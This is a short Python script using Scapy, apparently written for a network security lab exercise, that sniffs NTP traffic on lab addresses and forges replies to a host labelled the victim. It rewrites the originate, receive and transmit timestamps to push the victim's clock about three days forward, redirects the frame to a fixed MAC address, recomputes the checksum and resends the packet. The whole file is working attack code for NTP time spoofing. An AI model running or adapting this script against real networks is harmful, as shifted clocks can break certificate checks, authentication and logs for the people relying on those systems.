from scapy.all import *
from scapy.layers.ntp import NTP
import time, datetime, socket, os, array


server_ip = "10.10.10.12"
victim_ip = "10.10.10.10"
#all these values are hard coded for the sake of this exercise
def send_ntp(server, packet):
    try:
        print('here')
        ntp_packet = packet
        ntp_packet[UDP].chksum = 0
        print("incoming packet")
        ntp_packet.show()
        print()

        ntp_packet[UDP].dport = 123
        ntp_packet[UDP].sport = 123

        #ntp_packet[NTP].ref = ntp_packet[NTP].ref + 259201
        ntp_packet[NTP].orig = ntp_packet[NTP].ref + 259201
        ntp_packet[NTP].recv = ntp_packet[NTP].ref + 259201
        ntp_packet[NTP].sent = ntp_packet[NTP].ref + 259201
        
        ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"

        #checksum bit
        ntp_packet[UDP].chksum = checksum(ntp_packet)


        #ip_packet = IP(src=server, dst=dest_ip)
        #udp_packet = UDP(dport=123, sport=123)

        print("Packet before sending")
        ntp_packet.show()

        send(ntp_packet, verbose=True)
    except Exception as e:
        print("An error occurred:", e)

def checksum(packet):
    udp_header = bytes(packet[UDP])
    src_ip = socket.inet_aton(packet[IP].src)
    dst_ip = socket.inet_aton(packet[IP].dst)
    pseudo_header = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, socket.IPPROTO_UDP, len(udp_header))
    checksum = sum(array.array('H', pseudo_header)) + sum(array.array('H', udp_header))
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum += checksum >> 16
    checksum = ~checksum & 0xFFFF
    return checksum

def ntp_request(packet):
    print('here')
    ntp_layer = packet.getlayer(NTP)
    if ntp_layer and ntp_layer.mode == 4:
        send_ntp(victim_ip, packet)

if __name__ == "__main__":
    print('here')
    sniff(filter="udp and port 123", prn=ntp_request)
